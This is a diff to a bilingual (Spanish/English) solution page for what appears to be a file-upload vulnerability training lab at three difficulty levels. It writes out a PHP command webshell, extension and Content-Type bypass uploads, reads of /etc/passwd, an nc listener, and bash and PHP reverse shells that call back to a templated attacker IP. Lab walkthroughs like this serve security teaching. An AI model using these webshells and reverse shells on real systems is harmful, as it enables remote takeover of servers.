@@ -114,117 +114,141 @@
     <h3>Easy — Sin restricciones</h3>
     <p>El servidor acepta cualquier extensión. Sube directamente una webshell PHP.</p>
     <ol>
-      <li>Crea la webshell:</li>
-    </ol>
-    <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
-    <ol start="2">
-      <li>Guárdala como <code>shell.php</code> y súbela por el formulario, o con curl:</li>
-    </ol>
-    <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
-    <ol start="3">
-      <li>Ejecuta comandos:</li>
-    </ol>
-    <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
+      <li>Crea la webshell y guárdala como <code>shell.php</code>:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
+      </li>
+      <li>Súbela:
+        <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifica ejecución de comandos:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
 curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
-    <ol start="4">
-      <li>Para una shell interactiva genera una webshell con weevely:</li>
+      </li>
+      <li>Abre un listener en tu máquina atacante:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Lanza la reverse shell a través del parámetro <code>cmd</code>:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+      <li>Alternativa — reverse shell PHP directa. Sube este archivo como <code>revshell.php</code> y accede a él:
+        <pre>&lt;?php $sock=fsockopen("{{ client_ip }}",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?&gt;</pre>
+      </li>
     </ol>
-    <pre>weevely generate password shell.php
-curl -F "file=@shell.php" http://localhost:5000/upload
-weevely http://localhost:5000/uploads/shell.php password</pre>
 
     <h3>Medium — Blacklist bypass (doble extensión)</h3>
     <p>El servidor bloquea <code>.php</code>, <code>.py</code>, <code>.sh</code>, etc. por extensión final, pero permite doble extensión como <code>.php.jpg</code>.</p>
     <ol>
-      <li>Renombra tu webshell con doble extensión:</li>
+      <li>Crea la webshell y renómbrala con doble extensión:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
+# guárdala directamente como shell.php.jpg, o:
+cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Súbela (la extensión final <code>.jpg</code> supera el blacklist):
+        <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifica ejecución:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Abre un listener en tu máquina atacante:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Lanza la reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
     </ol>
-    <pre>cp shell.php shell.php.jpg</pre>
-    <ol start="2">
-      <li>Súbela (el formulario la acepta porque la extensión final es <code>.jpg</code>):</li>
-    </ol>
-    <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
-    <ol start="3">
-      <li>El servidor la ejecuta como PHP al acceder:</li>
-    </ol>
-    <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
-curl "http://localhost:5000/uploads/shell.php.jpg?cmd=whoami"</pre>
 
     <h3>Hard — Whitelist + Content-Type bypass</h3>
-    <p>El servidor valida extensión por whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) y Content-Type. El bypass con doble extensión sigue funcionando porque <code>.php.jpg</code> supera ambas comprobaciones.</p>
+    <p>El servidor valida extensión por whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) y Content-Type. La doble extensión <code>.php.jpg</code> supera ambas comprobaciones.</p>
     <ol>
-      <li>Prepara la webshell con doble extensión:</li>
+      <li>Prepara la webshell con doble extensión (igual que Medium):
+        <pre>cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Súbela forzando el Content-Type a <code>image/jpeg</code> para superar también la validación MIME:
+        <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verifica ejecución:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Abre un listener en tu máquina atacante:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Lanza la reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
     </ol>
-    <pre>cp shell.php shell.php.jpg</pre>
-    <ol start="2">
-      <li>Súbela forzando el Content-Type a <code>image/jpeg</code> (opcional, el bypass por nombre ya es suficiente):</li>
-    </ol>
-    <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
-    <ol start="3">
-      <li>Accede y ejecuta comandos igual que en Medium:</li>
-    </ol>
-    <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
-curl "http://localhost:5000/uploads/shell.php.jpg?cmd=cat+/etc/passwd"</pre>
 
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Easy — No restrictions</h3>
     <p>The server accepts any extension. Upload a PHP webshell directly.</p>
     <ol>
-      <li>Create the webshell:</li>
-    </ol>
-    <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
-    <ol start="2">
-      <li>Save it as <code>shell.php</code> and upload via the form, or with curl:</li>
-    </ol>
-    <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
-    <ol start="3">
-      <li>Execute commands:</li>
-    </ol>
-    <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
+      <li>Create the webshell and save it as <code>shell.php</code>:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;</pre>
+      </li>
+      <li>Upload it:
+        <pre>curl -F "file=@shell.php" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verify command execution:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=id"
 curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
-    <ol start="4">
-      <li>For an interactive shell, generate one with weevely:</li>
+      </li>
+      <li>Open a listener on your attacking machine:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Trigger the reverse shell via the <code>cmd</code> parameter:
+        <pre>curl "http://localhost:5000/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
+      <li>Alternative — direct PHP reverse shell. Upload this as <code>revshell.php</code> and access it:
+        <pre>&lt;?php $sock=fsockopen("{{ client_ip }}",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?&gt;</pre>
+      </li>
     </ol>
-    <pre>weevely generate password shell.php
-curl -F "file=@shell.php" http://localhost:5000/upload
-weevely http://localhost:5000/uploads/shell.php password</pre>
 
     <h3>Medium — Blacklist bypass (double extension)</h3>
     <p>The server blocks <code>.php</code>, <code>.py</code>, <code>.sh</code>, etc. by final extension, but allows double extensions like <code>.php.jpg</code>.</p>
     <ol>
-      <li>Rename your webshell with a double extension:</li>
+      <li>Create the webshell and rename it with a double extension:
+        <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
+# save it directly as shell.php.jpg, or:
+cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Upload it (the final <code>.jpg</code> extension bypasses the blacklist):
+        <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verify execution:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Open a listener on your attacking machine:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Trigger the reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
     </ol>
-    <pre>cp shell.php shell.php.jpg</pre>
-    <ol start="2">
-      <li>Upload it (the form accepts it because the final extension is <code>.jpg</code>):</li>
-    </ol>
-    <pre>curl -F "file=@shell.php.jpg" http://localhost:5000/upload</pre>
-    <ol start="3">
-      <li>The server executes it as PHP when accessed:</li>
-    </ol>
-    <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
-curl "http://localhost:5000/uploads/shell.php.jpg?cmd=whoami"</pre>
 
     <h3>Hard — Whitelist + Content-Type bypass</h3>
-    <p>The server validates against a whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) and Content-Type. The double-extension bypass still works because <code>.php.jpg</code> passes both checks.</p>
+    <p>The server validates against a whitelist (<code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.txt</code>) and Content-Type. The double extension <code>.php.jpg</code> bypasses both checks.</p>
     <ol>
-      <li>Prepare the webshell with double extension:</li>
+      <li>Prepare the webshell with a double extension (same as Medium):
+        <pre>cp shell.php shell.php.jpg</pre>
+      </li>
+      <li>Upload it forcing Content-Type to <code>image/jpeg</code> to also bypass MIME validation:
+        <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
+      </li>
+      <li>Verify execution:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"</pre>
+      </li>
+      <li>Open a listener on your attacking machine:
+        <pre>nc -lvnp 4444</pre>
+      </li>
+      <li>Trigger the reverse shell:
+        <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
+      </li>
     </ol>
-    <pre>cp shell.php shell.php.jpg</pre>
-    <ol start="2">
-      <li>Upload it forcing Content-Type to <code>image/jpeg</code> (optional — the name bypass is sufficient):</li>
-    </ol>
-    <pre>curl -F "file=@shell.php.jpg;type=image/jpeg" http://localhost:5000/upload</pre>
-    <ol start="3">
-      <li>Access and run commands just like Medium:</li>
-    </ol>
-    <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=id"
-curl "http://localhost:5000/uploads/shell.php.jpg?cmd=cat+/etc/passwd"</pre>
 
     <h3>Tools</h3>
-    <div><span class="tools-badge">curl</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
   </div>
 </div>
 
